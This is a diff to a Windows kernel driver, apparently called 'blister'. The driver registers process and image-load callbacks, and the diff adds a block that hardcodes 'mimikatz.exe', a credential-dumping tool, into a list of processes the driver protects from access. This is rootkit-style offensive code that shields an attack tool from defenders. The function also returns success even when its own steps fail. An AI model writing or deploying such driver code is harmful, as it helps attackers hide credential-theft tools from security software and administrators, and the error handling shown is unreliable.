@@ -17,7 +17,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 	UNREFERENCED_PARAMETER(RegistryPath);
 
     NTSTATUS returnStatus = NULL;
-    //HANDLE hThread = NULL;
+    HANDLE hThread = NULL;
     UNICODE_STRING altitudeString;
     OB_CALLBACK_REGISTRATION obOpenProcPre = { 0 };
 
@@ -45,6 +45,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 
     if (!NT_SUCCESS(returnStatus)) {
         ERROR("PsSetLoadImageNotifyRoutine failed to set ImageLoadNotifyCallback callback\n");
+        goto PostInitialization;
     }
     
     // mark the callback as registered in the driver status structure
@@ -59,6 +60,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 
     if (!NT_SUCCESS(returnStatus)) {
         ERROR("PsSetCreateProcessNotifyRoutineEx failed to set PCreateProcessNotifyRoutineEx callback\n");
+        goto PostInitialization;
     }
 
     // mark the callback as registered in the driver status structure
@@ -82,6 +84,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
     // check if the buffer was succesfully allocated
     if (obOpenProcPre.OperationRegistration == NULL) {
         returnStatus = STATUS_UNSUCCESSFUL;
+        goto PostInitialization;
     }
 
     obOpenProcPre.OperationRegistration->ObjectType = PsProcessType;
@@ -97,10 +100,48 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 
     if (!NT_SUCCESS(returnStatus)) {
         ERROR("ObRegisterCallbacks failed to set OpenProcessNotify callback\n");
+        goto PostInitialization;
     }
 
     // mark the callback as registered in the driver status structure
     driverState.Callbacks.ProcessNotify.IsRegistered = TRUE;
+
+PostInitialization:
+    // check if the rest of the DriverEntry function went smoothly
+    if (NT_SUCCESS(returnStatus)) {
+        // create a thread to report the registered callbacks
+        OBJECT_ATTRIBUTES objectAttributes;
+        InitializeObjectAttributes(&objectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+        returnStatus = PsCreateSystemThread(&hThread, SYNCHRONIZE, &objectAttributes, NULL, NULL, ReportCallbacks, NULL);
+
+        if (NT_SUCCESS(returnStatus)) {
+            INFO("Creating a PPL entry for the \"mimikatz.exe\" process\n");
+
+            // set a ProtectedProcessEntry with the process name "mimikatz.exe"
+            // we could also use a PID but that is obviously harder to hardcode
+            // allocate the entry with a tag of blEn (blisterEntry)
+            // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepool2
+            UNICODE_STRING mimiEntryName = RTL_CONSTANT_STRING(L"mimikatz.exe");
+            ProtectedProcessEntry* mimiEntry = (ProtectedProcessEntry*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ProtectedProcessEntry), 'blEn');
+
+            if (mimiEntry != NULL) {
+                // allocate a buffer for the process name with a tag of blPn (blisterProcessName)
+                mimiEntry->Name = (PUNICODE_STRING)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(UNICODE_STRING), 'blPn');
+                // allocate a buffer for the string buffer with a tag of blBf (blisterBuffer)
+                mimiEntry->Name->Buffer = (PWCH)ExAllocatePool2(POOL_FLAG_PAGED, mimiEntryName.Length, 'blBf');
+                mimiEntry->Name->MaximumLength = mimiEntryName.Length;
+
+                // copy the name into the Name attribute of the entry
+                RtlCopyUnicodeString(mimiEntry->Name, &mimiEntryName);
+                // add the entry to the list of processes to protect
+                InsertTailList(&driverState.SelfProtectedProcesses, &mimiEntry->CurrentEntry);
+            }
+            else {
+                ERROR("Failed to allocate entry for the protected process\n");
+                returnStatus = STATUS_UNSUCCESSFUL;
+            }
+        }
+    }
 
 	return STATUS_SUCCESS;
 }
